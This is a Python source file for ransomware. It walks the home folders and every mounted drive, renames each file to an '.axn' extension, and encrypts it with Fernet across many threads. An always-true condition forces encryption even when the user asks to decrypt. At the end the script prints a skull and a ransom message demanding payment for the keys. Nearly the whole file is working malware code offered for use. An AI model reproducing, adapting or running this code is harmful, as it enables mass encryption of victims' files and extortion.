import os
import json
import threading
from datetime import datetime
import random
from cryptography.fernet import Fernet

EXTENSIONS_FILE = "extensions.json"
KEY_FILE = "bhenchod.key"


# I will document It later 

documents_folder = os.path.join(os.path.expanduser("~"), "Documents")
program_files_folder = os.path.join(documents_folder, "ProgramFiles")
os.makedirs(program_files_folder, exist_ok=True)
KEY_FILE = os.path.join(program_files_folder, "encryption_key.key")

def generate_key():
    """Generate a Fernet encryption key and save it in ProgramFiles."""
    key = Fernet.generate_key()
    with open(KEY_FILE, "wb") as f:
        f.write(key)
    print(f"Key saved to: {KEY_FILE}")
    return key




def load_key():
    """Load encryption key from the file."""
    if os.path.exists(KEY_FILE):
        with open(KEY_FILE, "rb") as f:
            return f.read()
    else:
        return generate_key()


# 🔒 Encryption & Decryption Functions
def encrypt_file(file_path, key):
    """Encrypt a file."""
    try:
        with open(file_path, "rb") as f:
            data = f.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)

        with open(file_path, "wb") as f:
            f.write(encrypted)
        
        print(f"    ✅ Encrypted: {file_path}")

    except Exception as e:
        print(f"    ❌ Error encrypting {file_path}: {e}")


def decrypt_file(file_path, key, original_ext):
    """Decrypt a file."""
    try:
        with open(file_path, "rb") as f:
            encrypted_data = f.read()

        fernet = Fernet(key)
        decrypted = fernet.decrypt(encrypted_data)

        with open(file_path, "wb") as f:
            f.write(decrypted)

        # Restore original extension
        restored_path = change_extension(file_path, original_ext.lstrip('.'))
        print(f"    ✅ Decrypted: {file_path} ➝ {restored_path}")

    except Exception as e:
        print(f"    ❌ Decryption failed: {file_path} - {e}")


# 🔧 Utility Functions
def load_extensions():
    """Load previous file extensions from JSON."""
    if os.path.exists(EXTENSIONS_FILE):
        with open(EXTENSIONS_FILE, "r") as f:
            return json.load(f)
    return {}


def save_extensions(data):
    """Save extensions to JSON."""
    with open(EXTENSIONS_FILE, "w") as f:
        json.dump(data, f, indent=4)








def change_extension(file_path, new_extension):
    """Change file extension with conflict handling."""
    dir_name, file_name = os.path.split(file_path)
    base, _ = os.path.splitext(file_name)

    new_file_name = f"{base}.{new_extension.lstrip('.')}"
    new_file_path = os.path.join(dir_name, new_file_name)

    # Avoid conflicts
    if os.path.exists(new_file_path):
        timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
        random_suffix = random.randint(1000, 9999)
        new_file_name = f"{base}_{timestamp}_{random_suffix}.{new_extension.lstrip('.')}"
        new_file_path = os.path.join(dir_name, new_file_name)

    os.rename(file_path, new_file_path)
    return new_file_path








# 📂 Target directories
directories_to_process = [
    os.path.join(os.path.expanduser("~"), "Desktop"),
    os.path.join(os.path.expanduser("~"), "Documents"),
    os.path.join(os.path.expanduser("~"), "Downloads")
]







# Add other drives (Windows-specific)
if os.name == 'nt':
    import string
    drives = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    directories_to_process.extend(drives)
else:
    directories_to_process.extend([
        "/mnt", "/media", "/run/media"
    ])








# 🔒 Main Execution with Multithreading
key = load_key()
original_ext = load_extensions()

threads = []

# 🔥 Encrypt or Decrypt based on user input
action = input("Enter 'd' to decrypt: ").strip().lower()
i = 0
with open('enc.txt','r') as f:
    answer = f.read()
                
if answer != '1' or 1:
    action = "e"
    
for directory in directories_to_process:
    if os.path.exists(directory):
        for root, _, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                _, ext = os.path.splitext(file)

                
                
                if action == "e":
                    if ext != ".axn":
                        new_file_path = change_extension(file_path, "axn")
                        original_ext[new_file_path] = ext
                        save_extensions(original_ext)

                        thread = threading.Thread(target=encrypt_file, args=(new_file_path, key))
                        thread.start()
                        threads.append(thread)
                    if i == 0 :
                        with open('enc.txt','w') as f:
                            f.write('1')
                    i += 1 
                elif action == "d" and ext == ".axn":
                    original_extension = original_ext.get(file_path, ".txt")

                    thread = threading.Thread(target=decrypt_file, args=(file_path, key, original_extension))
                    thread.start()
                    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()



print('''
                             __xxxxxxxxxxxxxxxx___.
                        _gxXXXXXXXXXXXXXXXXXXXXXXXX!x_
                   __x!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!x_
                ,gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx_
              ,gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!_
            _!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!.
          gXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXs
        ,!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!.
       g!XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
      iXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
     ,XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
     !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
   ,XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXx
   !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXi
  dXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
  !XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
   XXXXXXXXXXXXXXXXXXXf~~~VXXXXXXXXXXXXXXXXXXXXXXXXXXvvvvvvvvXXXXXXXXXXXXXX!
   !XXXXXXXXXXXXXXXf`       'XXXXXXXXXXXXXXXXXXXXXf`          '~XXXXXXXXXXP
    vXXXXXXXXXXXX!            !XXXXXXXXXXXXXXXXXX!              !XXXXXXXXX
     XXXXXXXXXXv`              'VXXXXXXXXXXXXXXX                !XXXXXXXX!
     !XXXXXXXXX.                 YXXXXXXXXXXXXX!                XXXXXXXXX
      XXXXXXXXX!                 ,XXXXXXXXXXXXXX                VXXXXXXX!
      'XXXXXXXX!                ,!XXXX ~~XXXXXXX               iXXXXXX~
       'XXXXXXXX               ,XXXXXX   XXXXXXXX!             xXXXXXX!
        !XXXXXXX!xxxxxxs______xXXXXXXX   'YXXXXXX!          ,xXXXXXXXX
         YXXXXXXXXXXXXXXXXXXXXXXXXXXX`    VXXXXXXX!s. __gxx!XXXXXXXXXP
          XXXXXXXXXXXXXXXXXXXXXXXXXX!      'XXXXXXXXXXXXXXXXXXXXXXXXX!
          XXXXXXXXXXXXXXXXXXXXXXXXXP        'YXXXXXXXXXXXXXXXXXXXXXXX!
          XXXXXXXXXXXXXXXXXXXXXXXX!     i    !XXXXXXXXXXXXXXXXXXXXXXXX
          XXXXXXXXXXXXXXXXXXXXXXXX!     XX   !XXXXXXXXXXXXXXXXXXXXXXXX
          XXXXXXXXXXXXXXXXXXXXXXXXx_   iXX_,_dXXXXXXXXXXXXXXXXXXXXXXXX
          XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXP
          XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
           ~vXvvvvXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf
                    'VXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXvvvvvv~
                      'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX~
                  _    XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXv`
                 -XX!  !XXXXXXX~XXXXXXXXXXXXXXXXXXXXXX~   Xxi
                  YXX  '~ XXXXX XXXXXXXXXXXXXXXXXXXX`     iXX`
                  !XX!    !XXX` XXXXXXXXXXXXXXXXXXXX      !XX
                  !XXX    '~Vf  YXXXXXXXXXXXXXP YXXX     !XXX
                  !XXX  ,_      !XXP YXXXfXXXX!  XXX     XXXV
                  !XXX !XX           'XXP 'YXX!       ,.!XXX!
                  !XXXi!XP  XX.                  ,_  !XXXXXX!
                  iXXXx X!  XX! !Xx.  ,.     xs.,XXi !XXXXXXf
                   XXXXXXXXXXXXXXXXX! _!XXx  dXXXXXXX.iXXXXXX
                   VXXXXXXXXXXXXXXXXXXXXXXXxxXXXXXXXXXXXXXXX!
                   YXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXV
                    'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX!
                    'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf
                       VXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXf
                         VXXXXXXXXXXXXXXXXXXXXXXXXXXXXv`
                          ~vXXXXXXXXXXXXXXXXXXXXXXXf`
                              ~vXXXXXXXXXXXXXXXXv~
                                 '~VvXXXXXXXV~~
                                       ~~
      ''')
print('All of Your files are encrypted with a strong algorithm. Please Pay 10 rupees to get keys:')

print("\n✅ Operation completed!")

while True:
    a = input()
    if len(a) > 0:
        break
